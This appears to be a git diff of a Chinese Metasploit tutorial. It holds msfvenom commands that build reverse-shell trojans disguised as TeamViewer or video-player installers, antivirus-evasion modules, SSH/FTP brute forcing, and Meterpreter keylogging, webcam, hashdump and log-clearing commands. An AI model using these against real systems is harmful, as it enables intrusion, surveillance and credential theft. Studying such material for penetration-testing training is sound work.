@@ -2,7 +2,7 @@
 
 ## 使用框架结构
 
-<figure><img src="../../.gitbook/assets/20221021181843.png" alt=""><figcaption></figcaption></figure>
+![MSF](https://img-blog.csdnimg.cn/31eeda4d861140b8bf8181232a6dcc69.png)
 
 ## 一、 介绍
 
@@ -71,13 +71,7 @@ grep meterpreter show payloads  # 搜索 meterpreter 的 Payload
 | windows/x64/powershell/$          | 交互式 PowerShell 会话 + 上述品种                    |
 | windows/x64/vncinject/$           | VNC Server (Reflective Injection) + 以上品种    |
 
-### 4. 编码器
-
-```shell
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
-```
-
-### 5. 数据库
+### 4. 数据库
 
 ```shell
 sudo systemctl start postgresql  # 启动 postgresql 数据库
@@ -105,7 +99,7 @@ loot -h # 提供拥有服务和用户的概览列表
 
 ### 6. 插件
 
-> 1. 插件需要安装在 /usr/share/metasploit-framework/plugins
+> 插件需要安装在 /usr/share/metasploit-framework/plugins
 
 ```shell
 load nessus  # 加载 nessus 插件
@@ -155,113 +149,109 @@ lsa_dump_secrets
 
 ## 五、基本使用
 
-### 1. 核心命令
+### 1. 模块命令
 
-1. conect 命令： connect 的命令主要用于远程连接主机，一般用于内网渗透
+![image-20220806174751642](https://img-blog.csdnimg.cn/12850ddc033d4f889acf6edb69598ac5.png)
 
-<figure><img src="../../.gitbook/assets/20220806160049.png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../.gitbook/assets/20220806174919.png" alt=""><figcaption></figcaption></figure>
-
-### 2. 模块命令
+>
 
 ## 六、信息收集
 
-### 1. 基于 TCP 协议进行收集
-
-1. 使用 MSF 中的 nmap 和 arp\_sweep 进行收集主机信息
-   1. 使用 nmap : `db_nmap -sV 192.168.18.2`
-   2. 使用 ARP 进行扫描： `use auxiliary/scanner/discovery/arp_sweep`
-2. 使用半连接扫描 TCP
-   1. 使用 SYN 数据报扫描： `use auxiliary/scanner/portscan/syn`
-3. 使用 auxiliary/sniffer 下的 psnuffle 模块进行密码嗅探
-   1. 在局域网内进行网络嗅探： `use auxiliary/sniffer/psnuffle` 关闭方法： `jobs -K` 关闭所有
-
-### 2. 基于 SNMP 协议收集主机信息
-
-1. 定义： SNMP 全称 简单网络管理协议，由一组网络管理的标准组成，包含一个应用层协议、数据库模型和一组资源对象，该协议能够支持网络管理系统，用以检测连接到网络上的设备是否有任何引起管理上关注的情况
-2.  执行： 目标主机开启 SNMP 服务：
-
-    ```shell
-    use auxiliary/scanner/snmp/snmp_enum 
-    ```
-
-​ `可以查到的信息： 服务器硬件信息、当前运行进程`
-
-### 3. 基于 SMB 协议进行信息收集
-
-1. 介绍： SMB 全称 服务器消息块，又称网络文件共享系统，是一种应用层网络传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源
-2. 扫描版本号 `use auxiliary/scanner/smb/smb_enumshares`
-3.  扫描共享文件(账号、密码)
-
-    ```shell
-    use auxiliary/scanner/smb/smb_enumshares
-    set SMBUser Administrator
-    set SMBPASS 123456
-    ```
-4.  使用 SMB\_lookupsid 扫描系统用户的信息
-
-    ```shell
-    use auxiliary/scanner/smb/smb_lookupsid
-    set SMBUser Administrator
-    set SMBPASS 123456
-    ```
-
-### 4. 基于SSH协议信息收集
-
-1.  查看 SSH 服务版本信息
-
-    ```shell
-    use auxiliary/scanner/ssh/ssh_version     # 辅助模块
-    set rhosts 192.168.18.137  # 设置目标参数
-    run # 执行
-    ```
-2.  对 SSH 暴力破解
-
-    ```shell
-    use  auxiliary/scanner/ssh/ssh_login  # 使用攻击模块
-        set rhosts 192.168.18.137  # 设置目标参数
-        set  USERPASS_FILE  /home/jlb/root_userpass.txt  # 设置密码文件
-        set VERBOSE  true # 显示破解过程
-        run # 执行
-        seesions  # 显示会话
-        sessions -i 1 # 使用指定会话
-    ```
-
-### 4. 基于 FTP 协议进行信息收集
+### 1. 端口扫描
 
 ```shell
-use auxiliary/scanner/ftp/ftp_version # 使用指定模块 查看 FTP 版本
-	set rhosts 192.168.18.137  # 设置参数
-	run  # 执行
-use  exploit/unix/ftp/vsftpd_234_backdoor  # 使用指定版本的模块
-	set rhosts 192.168.18.137  # 设置参数
-	run # 执行
+msf6 > search portscan  # 该命令可以列出所有可以用的端口扫描模块
 ```
 
-FTP 匿名登陆：
+| 名称              | 功能                    |
+| --------------- | --------------------- |
+| udp\_sweep      | 快速识别 UDP 上运行的服务       |
+| arp\_sweep      | ARP 扫描收集信息            |
+| syn             | SYN-TCP 扫描            |
+| ftp\_version    | FTP 版本扫描              |
+| ftp/anonymous   | FTP 匿名登陆              |
+| ftp\_login      | FTP 爆破                |
+| ssh\_version    | SSH 版本扫描              |
+| ssh\_login      | SSH 爆破                |
+| smb\_version    | SMB 版本扫描              |
+| smb\_enumshares | SMB 信息收集模块            |
+| smb\_lookupsid  | 收集系统用户信息              |
+| snmp\_enum      | 根据 SNMP 收集服务器信息 \[见下] |
+| psnuffle        | 密码嗅探 \[见下]            |
+
+> 1.  使用 auxiliary/sniffer 下的 psnuffle 模块进行密码嗅探
+>
+>     在局域网内进行网络嗅探： `use auxiliary/sniffer/psnuffle` 关闭方法： `jobs -K` 关闭所有
+> 2. 定义： SNMP 全称 简单网络管理协议，由一组网络管理的标准组成，包含一个应用层协议、数据库模型和一组资源对象，该协议能够支持网络管理系统，用以检测连接到网络上的设备是否有任何引起管理上关注的情况 `可以查到的信息： 服务器硬件信息、当前运行进程`
+
+## 七、后期开发
 
 ```shell
-use auxiliary/scanner/ftp/anonymous   # 使用指定模块
-	set rhosts 192.168.18.137  # 设置参数
-	run # 执行
-	# 执行成功后。使用 FTP 软件进行连接
+meterpreter > getpid 	# 获取当前请求 ID
+Current pid: 1304
+meterpreter > ps 		# 列出所有进行
+meterpreter > migrate 716	# 迁移进程
 ```
 
-FTP 暴力破解：
-
-```shell
-use auxiliary/scanner/ftp/ftp_login  # 设置指定模块
-	set rhosts 192.168.18.137  # 设置参数
-	set  USERPASS_FILE  /home/jlb/root_userpass.txt  # 设置密码文件
-	run # 执行
-```
+1. 核心命令
+   * `background`：背景当前会话
+   * `exit`：终止Meterpreter会话
+   * `guid`: 获取会话GUID (Globally Unique Identifier)
+   * `help`：显示帮助菜单
+   * `info`: 显示有关 Post 模块的信息
+   * `irb`：在当前会话中打开交互式 Ruby shell
+   * `load`: 加载一个或多个 Meterpreter 扩展
+   * `migrate`: 允许您将 Meterpreter 迁移到另一个进程
+   * `run`: 执行一个 Meterpreter 脚本或 Post 模块
+   * `sessions`：快速切换到另一个会话
+2. 文件系统命令
+   * `cd`: 会改变目录
+   * `ls`: 将列出当前目录中的文件（dir 也可以）
+   * `pwd`: 打印当前工作目录
+   * `edit`: 将允许您编辑文件
+   * `cat`: 将文件的内容显示到屏幕上
+   * `rm`: 将删除指定的文件
+   * `search`：将搜索文件
+   * `upload`: 将上传文件或目录
+   * `download`: 将下载一个文件或目录
+3. 联网命令
+   * `arp`：显示主机ARP（地址解析协议）缓存
+   * `ifconfig`：显示目标系统上可用的网络接口
+   * `netstat`：显示网络连接
+   * `portfwd`：将本地端口转发到远程服务
+   * `route`：允许您查看和修改路由表
+4. 系统命令
+   * `clearev`：清除事件日志
+   * `execute`: 执行命令
+   * `getpid`: 显示当前进程标识符
+   * `getuid`: 显示 Meterpreter 正在运行的用户
+   * `kill`: 终止进程
+   * `pkill`: 按名称终止进程
+   * `ps`：列出正在运行的进程
+   * `reboot`：重新启动远程计算机
+   * `shell`：进入系统命令外壳
+   * `shutdown`：关闭远程计算机
+   * `sysinfo`: 获取远程系统的信息，例如OS
+5. 其他命令（这些将在帮助菜单的不同菜单类别下列出）
+   * `idletime`：返回远程用户空闲的秒数
+   * `keyscan_dump`：转储击键缓冲区
+   * `keyscan_start`：开始捕获击键
+   * `keyscan_stop`: 停止捕获击键
+   * `screenshare`：允许您实时观看远程用户的桌面
+   * `screenshot`：抓取交互式桌面的屏幕截图
+   * `record_mic`：从默认麦克风录制音频 X 秒
+   * `webcam_chat`：开始视频聊天
+   * `webcam_list`：列出网络摄像头
+   * `webcam_snap`：从指定的网络摄像头拍摄快照
+   * `webcam_stream`：播放来自指定网络摄像头的视频流
+   * `getsystem`：尝试将您的特权提升到本地系统的特权
+   * `hashdump`: 转储 SAM 数据库的内容
 
 ## 七、实战
 
 攻击流程：
 
-<figure><img src="../../.gitbook/assets/20220807202421.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://img-blog.csdnimg.cn/5de915029df748d6bb4f8cb6090192ad.png" alt=""><figcaption></figcaption></figure>
 
 ### 1. 使用永恒之蓝攻击 win7
 
@@ -330,10 +320,7 @@ services  # 所有的目标在当前数据库中的服务信息
 
 1. 目标： 使用 msfvenon 生成快播和西瓜影音看片神奇后门木马
 2. 流程：
-3.
-
-    <figure><img src="../../.gitbook/assets/20220808102329.png" alt=""><figcaption></figcaption></figure>
-4.  生成后门程序
+3.  生成后门程序
 
     ```shell
     # 使用一个编码器
@@ -360,7 +347,7 @@ services  # 所有的目标在当前数据库中的服务信息
     	-f exe # 指定输出文件格式
     	-o /ver/www/html/西瓜影音1.exe  # 文件输出位置
     ```
-5.  使用 MSF 监听
+4.  使用 MSF 监听
 
     ```shell
     use exploit/multi/handler  # 设置模块
@@ -369,7 +356,7 @@ services  # 所有的目标在当前数据库中的服务信息
     	run  # 执行
     		# 查看获取的权限，进行提权
     ```
-6.  模拟黑客给软件加后门： 在 .exe 文件中注入后门。 注入思路： 先看主程序附加了那些小程序，在小程序上面进行添加 payload
+5.  模拟黑客给软件加后门： 在 .exe 文件中注入后门。 注入思路： 先看主程序附加了那些小程序，在小程序上面进行添加 payload
 
     ```shell
     # 使用 kaill 工具给附加小程序添加 payload  
@@ -384,7 +371,7 @@ services  # 所有的目标在当前数据库中的服务信息
     	-f exe # 指定输出文件格式
     	-o /ver/www/html/1.exe  # 文件输出位置
     ```
-7.  使用 evasion 模块生成免杀木马：
+6.  使用 evasion 模块生成免杀木马：
 
     ```shell
     use evasion/windows/windows_defender_exe  # 使用指定模块
